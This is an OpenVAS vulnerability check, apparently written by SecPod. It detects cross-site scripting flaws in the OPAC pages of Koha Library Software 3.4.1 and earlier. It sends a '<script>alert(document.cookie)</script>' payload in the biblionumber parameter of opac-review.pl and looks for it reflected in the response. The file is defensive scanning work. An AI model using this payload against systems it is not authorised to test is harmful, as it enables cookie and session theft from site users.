###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_koha_opac_mult_xss_vuln.nasl 12006 2018-10-22 07:42:16Z mmartin $
#
# Koha Library Software OPAC Multiple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902640");
  script_version("$Revision: 12006 $");
  script_bugtraq_id(48895);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 09:42:16 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-30 11:26:06 +0530 (Wed, 30 Nov 2011)");
  script_name("Koha Library Software OPAC Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.");
  script_tag(name:"affected", value:"Koha Library Software versions 3.4.1 and prior.");
  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied input in
  'bib_list' parameter to opac-downloadcart.pl, 'biblionumber' parameter to
  opac-serial-issues.pl, opac-addbybiblionumber.pl, opac-review.pl and
  'shelfid' parameter to opac-sendshelf.pl and opac-downloadshelf.pl.");
  script_tag(name:"solution", value:"Upgrade to Koha Library Software version 3.4.2 or later.");
  script_tag(name:"summary", value:"The host is running Koha Library Software and is prone to multiple
  cross-site scripting vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/45435/");
  script_xref(name:"URL", value:"http://koha-community.org/koha-3-4-2/");
  script_xref(name:"URL", value:"http://en.securitylab.ru/lab/PT-2011-05");
  script_xref(name:"URL", value:"http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=6518");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103440/PT-2011-05.txt");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach dir (make_list_unique("/", "/koha", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/opac-main.pl", port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  if("koha" >< res && "Library" >< res)
  {
    url = string(dir, '/koha/opac-review.pl?biblionumber="<script>alert' +
                      '(document.cookie)</script>');

    if(http_vuln_check(port:port, url:url, pattern:"<script>alert" +
                       "\(document.cookie\)</script>", check_header:TRUE))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
